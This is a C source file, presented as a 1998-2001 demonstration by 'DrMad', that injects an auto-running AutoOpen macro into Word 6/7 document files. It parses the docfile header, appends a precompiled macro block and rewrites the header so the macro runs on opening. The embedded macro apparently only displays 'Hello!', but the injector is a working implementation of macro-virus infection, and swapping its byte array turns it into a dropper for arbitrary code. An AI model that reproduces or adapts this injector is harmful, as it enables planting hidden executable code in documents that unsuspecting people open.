// ************************************************ ******************* /
// * Demonstration of embedding executable macros in WinWord 6/7 files * /
// * (c) Constantin E. Climentieff aka DrMad, Samara 1998-2001 * /
// ************************************************ ******************* /
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <io.h>

#define WORD  unsigned int
#define BYTE  unsigned char
#define DWORD unsigned long

struct DOCHdr     // Document Title
{
  DWORD Sign;     // Document signature
  DWORD Vers;     // MsWord version
  BYTE  R1[8];    // ?
  WORD  Flags;    // Docfile type
  BYTE  R2[0x106];// ?
  DWORD AMacr;    // Address of the macros header
};

struct MACHdr     // Macro Title
{
  WORD  Sign;     // Macro header signature
  WORD  NMacr;    // Number of macros
};

#define LEN 97

BYTE CODE[LEN]={
 0xFF, 0x01, 0x01, 0x00, 0x55, 0x00, 0x00, 0x00,
 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
 0x20, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x10, 0x0D, 0x00, 0x08,
 0x41, 0x75, 0x74, 0x6F, 0x4F, 0x70, 0x65, 0x6E,
 0x01, 0x00, 0x11, 0x01, 0x00, 0x00, 0x00, 0x08,
 0x41, 0x55, 0x54, 0x4F, 0x4F, 0x50, 0x45, 0x4E,
 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x01, 0x00, 0x64, 0x1B, 0x69, 0x04, 0x4D, 0x41,
 0x49, 0x4E, 0x64, 0x67, 0x2B, 0x80, 0x6A, 0x06,
 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x21, 0x12, 0x6A,
 0x00, 0x12, 0x6C, 0x10, 0x00, 0x64, 0x1A, 0x1B,
 0x00
};

struct DOCHdr dh;       // docfile header
struct MACHdr mh;       // Macro title (start)
DWORD         buf[128]; // Big Block
DWORD         p;        // Position of the document in the file
DWORD         l;        // File length
int           i;
int           f;
int           q;
char          s[32];

main( int an, char **as )
{

 if (an<2) {
   puts("Demonstration of embedding macros in Docfile");
   puts("(c) Constantin E. Climentieff aka DrMad, Samara 2001");
   puts("----------------------------------------------------");
   printf("File >"); scanf("%s",s);
 }
 else
  strcpy(s, as[1]);

 f = open(s, O_RDWR|O_BINARY);

 l = lseek( f, 0, SEEK_END);   // File length
 lseek( f, 0, SEEK_SET);

 q=read(f, buf, 512);

 if (buf[0]!=0xE011CFD0)
  { puts("This is not docfile!"); goto ex; }

 p = 0; i=0;
 while (q==512)
  {

   if ((buf[0]==0x65A5DC)||    // Looking for a header signature
       (buf[0]==0x68A5DC)||
       (buf[0]==0x68A697)||
       (buf[0]==0x68A699)||
       (buf[0]==0xC1A5EC))  p = (DWORD)i*512;

   q = read( f, buf, 512); i++;
  }

 if (!p)
  { puts("This is not docfile 6.0!"); goto ex; }

 lseek( f, p, SEEK_SET );
 read ( f, &dh, sizeof(dh) );       // Read the docfile header
 lseek( f, dh.AMacr+p, SEEK_SET );
 read ( f, &mh, sizeof(mh) );       // Read the title of macros

 if (((mh.Sign==0x1FF)&&(mh.NMacr>0))||(dh.Flags==1))
   { puts("The file already contains macros!"); goto ex; }

 l = (l%512)?((l/512)+1)*512:l;       // Align to the 512-byte border

 * (DWORD *)(&CODE[0x18]) = l-p+0x40; // Offset the macro code
 lseek( f, l, SEEK_SET);
 write( f, CODE, LEN  );              // We write the macro header + code at once

 dh.AMacr = l - p;                    // Offset the title of the macro
 dh.Flags = 1;
 lseek( f, p, SEEK_SET);
 write( f, &dh, sizeof(dh));

 puts("Well done!");

ex:

 close(f);

}
